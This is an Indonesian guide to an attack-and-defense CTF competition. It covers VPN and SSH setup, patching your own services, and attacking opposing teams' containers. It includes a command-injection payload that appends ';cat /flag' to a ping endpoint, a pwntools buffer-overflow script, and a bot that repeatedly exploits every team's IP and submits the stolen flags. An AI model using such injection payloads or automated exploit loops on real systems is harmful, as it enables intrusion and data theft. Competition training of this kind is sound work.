    # ⚔️ PANDUAN LENGKAP SIMULASI ATTACK & DEFENSE (A&D) — IONIC 2026

Panduan ini menjelaskan alur kerja, strategi penyerangan (*Attack*), pertahanan (*Defense*), cara mengeksploitasi celah service lawan, serta script otomatisasi penyerahan flag (*Auto-Submit Exploit Script*).

---

## 🎯 1. Konsep Dasar Attack & Defense

Di kompetisi **Attack & Defense (A&D)**:
1. Setiap tim diberikan **1 server/container sendiri** yang menjalankan 4 service yang sama dengan tim lawan.
2. Setiap service memiliki celah keamanan (*vulnerability*).
3. Setiap putaran (**Tick / Round**), sistem (*Checker Engine*) menaruh **Flag baru** di dalam masing-masing service semua tim.
4. **Tugas Tim:**
   - 🛡️ **Defense (Bertahan):** Masuk ke service sendiri via SSH, temukan celah bug-nya, lalu perbaiki (*patch*) agar tim lain tidak bisa mengambil flag kita.
   - ⚔️ **Attack (Menyerang):** Jalankan exploit ke IP tim lawan untuk mencuri flag mereka, lalu submit flag tersebut ke server untuk mendapatkan poin (+100 per flag)!

---

## 📋 2. Informasi Jaringan & Target Tim Lawan

### Daftar Service & Port:
| Service | Kategori | Port | Lokasi Celah Umum |
| :--- | :---: | :---: | :--- |
| `simple-web` | Web | `1337` | SQL Injection, Command Injection, LFI |
| `coloring` | Web | `8082` | SSTI, Insecure Deserialization, File Upload |
| `simple-pwn` | Pwn | `7070` | Buffer Overflow, Format String, ROP |
| `simple-crypto` | Crypto | `6969` | Weak PRNG, RSA Small Public Exponent, Padding Oracle |

### Daftar IP 10 Tim Peserta:
| Tim ID | Nama Tim | IP Target |
| :---: | :--- | :--- |
| **Team 1** | United Shell-SCC | `172.0.9.2` |
| **Team 2** | rootsanctum | `172.0.9.3` |
| **Team 3** | WilSec - Apa aja | `172.0.9.4` |
| **Team 4** | Maaf TKA Pilih CTF | `172.0.9.5` |
| **Team 5** | WilSec - BOEDOET 47 | `172.0.9.6` |
| **Team 6** | kata magfi "bebas" | `172.0.9.7` |
| **Team 7** | Z3RODAY | `172.0.9.8` |
| **Team 8** | Gangantua | `172.0.9.9` |
| **Team 9** | WilSec - Panitia | `172.0.9.10` |
| **Team 10** | Duo Perncari Flag | `172.0.9.11` |

---

## 🚀 3. Langkah Demi Langkah (Step-by-Step)

### Langkah 1: Konek ke Jaringan VPN (WireGuard)
1. Buka web platform $\rightarrow$ Buka **A&D Toolkit** di sidebar kanan.
2. Klik bagian **VPN config** $\rightarrow$ Klik **Download .conf**.
3. Hubungkan VPN di laptop kamu:
   - **Linux:**
     ```bash
     sudo wg-quick up ./ad-game-5.conf
     ```
   - **Windows / macOS:**
     Buka aplikasi **WireGuard Client** $\rightarrow$ *Add Tunnel* $\rightarrow$ Pilih file `.conf` $\rightarrow$ Klik *Activate*.
4. Tes koneksi ke target:
   ```bash
   ping 172.0.9.2
   nc -zv 172.0.9.2 1337
   ```

---

### Langkah 2: Pertahankan Service Sendiri (Defense / Patching)
1. Buka **A&D Toolkit** $\rightarrow$ Masuk ke menu **Shell access (SSH)**.
2. Daftarkan SSH Public Key laptop kamu (`cat ~/.ssh/id_ed25519.pub`).
3. Akses container service tim kamu via SSH:
   ```bash
   # Ganti 1 dengan ID challenge (1: crypto, 2: pwn, 3: simple-web, 4: coloring)
   ssh 3@10.43.170.150 -p 2222 -i ~/.ssh/id_ed25519
   ```
4. Backup source code asli:
   ```bash
   cp app.py app.py.bak
   ```
5. Perbaiki celah keamanan pada file source code.
6. **PENTING:** Pastikan service tetap berjalan normal (*SLA Health Check tetap UP*). Jangan menghapus fungsi autentikasi dasar atau mematikan port service!

---

### Langkah 3: Melakukan Penyerangan (Attack & Exploit)

#### Contoh A: Menyerang Service Web (Misal Tim 2 - `172.0.9.3:1337`)
Misalkan service `simple-web` memiliki celah Command Injection di endpoint `/api/ping?host=`:

```bash
# Uji coba exploit manual via curl:
curl "http://172.0.9.3:1337/api/ping?host=127.0.0.1;cat+/flag"
# Hasil response:
# flag{ionic26_2_simple-web_t61_8f9a2b1c}
```

#### Contoh B: Menyerang Service Pwn / Netcat (Misal Tim 3 - `172.0.9.4:7070`)
```python
from pwn import *

# Konek ke service pwn tim lawan
r = remote("172.0.9.4", 7070)
r.recvuntil(b"Input: ")
payload = b"A" * 64 + p64(0x4011B6)  # Contoh ret2win payload
r.sendline(payload)
flag = r.recvregex(r"flag\{.*?\}").decode()
print("Flag didapat:", flag)
```

---

### Langkah 4: Submit Flag ke Server

Setelah flag didapat (contoh: `flag{ionic26_2_simple-web_t61_8f9a2b1c}`):

#### Cara 1: Lewat Web UI (Sidebar Kanan)
1. Buka halaman **Challenges** di browser.
2. Paste flag di kotak **Captured flags** di sebelah kanan.
3. Klik tombol **Submit attack**.
4. Poin kamu akan langsung bertambah **+100 poin** dan skor tim korban berkurang **-50 poin**!

#### Cara 2: Lewat cURL Terminal
```bash
curl -X POST "https://photographic-deck-package-collectibles.trycloudflare.com/api/Game/5/Ad/Submit" \
  -H "Content-Type: application/json" \
  -d '{"flags": ["flag{ionic26_2_simple-web_t61_8f9a2b1c}"]}'
```

---

## 🤖 4. Script Exploit Otomatis (Auto-Attack & Auto-Submit Bot)

Di babak final A&D, kamu tidak perlu menyerang satu per satu secara manual. Cukup jalankan script Python ini di terminal laptopmu: script akan otomatis meretas seluruh 10 tim lawan dan langsung men-submit flag-nya setiap 30 detik!

Simpan script berikut sebagai `auto_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import re
import time

# URL Server CTF IONIC 2026
SUBMIT_URL = "https://photographic-deck-package-collectibles.trycloudflare.com/api/Game/5/Ad/Submit"

# Daftar IP semua tim (lewati tim kamu sendiri, misal kamu Tim 7)
MY_TEAM_ID = 7
TARGET_TEAMS = [
    {"id": 1, "ip": "172.0.9.2"},
    {"id": 2, "ip": "172.0.9.3"},
    {"id": 3, "ip": "172.0.9.4"},
    {"id": 4, "ip": "172.0.9.5"},
    {"id": 5, "ip": "172.0.9.6"},
    {"id": 6, "ip": "172.0.9.7"},
    {"id": 8, "ip": "172.0.9.9"},
    {"id": 9, "ip": "172.0.9.10"},
    {"id": 10, "ip": "172.0.9.11"},
]

def exploit_simple_web(ip):
    """Contoh fungsi exploit untuk simple-web (port 1337)"""
    try:
        url = f"http://{ip}:1337/api/ping?host=127.0.0.1;cat+/flag"
        res = requests.get(url, timeout=3)
        flags = re.findall(r"flag\{[a-zA-Z0-9_\-]+\}", res.text)
        return flags
    except Exception:
        return []

def submit_flags(flags):
    """Fungsi submit flag batch ke server"""
    if not flags:
        return
    try:
        payload = {"flags": list(set(flags)), "teamId": MY_TEAM_ID}
        res = requests.post(SUBMIT_URL, json=payload, timeout=5)
        data = res.json()
        print(f"[+] Submit result: Accepted {data.get('acceptedCount', 0)} flags! Total +{data.get('totalPoints', 0)} pts")
    except Exception as e:
        print(f"[-] Gagal submit ke server: {e}")

def main():
    print("[*] Bot Auto-Exploit IONIC 2026 Aktif...")
    while True:
        captured_flags = []
        for target in TARGET_TEAMS:
            ip = target["ip"]
            tid = target["id"]
            
            # 1. Jalankan exploit ke target
            flags = exploit_simple_web(ip)
            if flags:
                print(f"[!] Berhasil retas Tim {tid} ({ip})! Flag: {flags}")
                captured_flags.extend(flags)
        
        # 2. Submit semua flag yang didapat sekaligus
        if captured_flags:
            submit_flags(captured_flags)
        else:
            print("[.] Belum ada flag baru yang didapat pada putaran ini.")
            
        # Tunggu 30 detik untuk round / tick berikutnya
        print("[*] Menunggu tick berikutnya (30 detik)...\n")
        time.sleep(30)

if __name__ == "__main__":
    main()
```

Jalankan bot:
```bash
python3 auto_exploit.py
```

Setiap kali bot berhasil mengambil flag lawan, poin tim kamu akan otomatis melonjak naik di papan skor secara realtime! 🚀
